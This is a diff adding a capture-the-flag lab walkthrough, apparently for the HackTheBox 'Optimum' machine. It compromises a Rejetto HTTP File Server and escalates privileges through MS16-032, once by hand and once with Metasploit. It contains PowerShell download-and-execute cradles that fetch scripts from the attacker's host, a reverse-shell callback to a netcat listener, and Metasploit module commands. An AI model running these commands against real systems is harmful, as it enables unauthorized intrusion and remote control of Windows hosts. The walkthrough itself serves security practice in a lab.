@@ -1,0 +1,53 @@
+# Non-Metasploit method.
+
+Step 1 (Enumeration)
+- Target has HTTPFileServer running on port 80.
+
+Step 2 (Foot hold)
+- https://www.exploit-db.com/exploits/39161
+- This Rejetto HTTP File Server exploit for remote execution allows for a shell to be opened as the user running the FileServer.
+- (To run you will need to change the lport and lhost, open a SimpleHTTPServer hosting a nc.exe executable and have a nc session open on the lport specified)
+
+
+Step 3 (Enumeration)
+- C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://<lhost>:<lport>/Sherlock.ps1')
+- Run a powershell script to grab the sherlock script and run it from the lhost which has SimpleHTTPServer running on a directory with sherlock script.
+- Running the sherlock script gives us privilege escalation vulnerabilities to try.
+
+Step 4 (Privilege escalation)
+- powershell.exe IEX(New-Object Net.WebClient).downloadString(http://<lhost>:<lport>/<script name.ps1>')
+- https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
+- Using Secondary Logon Handle exploit which allows for a container to be created which runs powershell code.
+- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
+- At the end of the container add a 'Invoke-PowerShellTcp -Reverse -IPAddress <lhost> -Port <lport>' adapting the lhost and lport.
+- Have SimpleHTTPServer running for both call-backs and a nc listener specified on the shell lport and lhost.
+
+Step 5 (Pilfering)
+
+# Metasploit method.
+
+Step 1 (Enumeration)
+- Target has HTTPFileServer running on port 80.
+
+Step 2 (Exploit)
+- use exploit/windows/http/rejetto_hfs_exec
+- set RHOST 10.10.10.8
+- set RHOST 80
+- set SRVHOST <lhost>
+- set SRVPORT <lport>
+- run
+
+Step 3 (Enumeration)
+- use post/multi/recon/local_exploit_suggester
+- set session
+- run
+- (Migrate to different bit architecture process to run suggester on both 32 and 64 bit)
+
+Step 4 (Privilege escalation)
+- use exploit/ms16_032_secondary_logon_handler_privesc
+- set options
+- exploit
+
+Ensure the exploit and running meterpreter sessoin being used are the same architecture
+
+Step 5 (Pilfering)
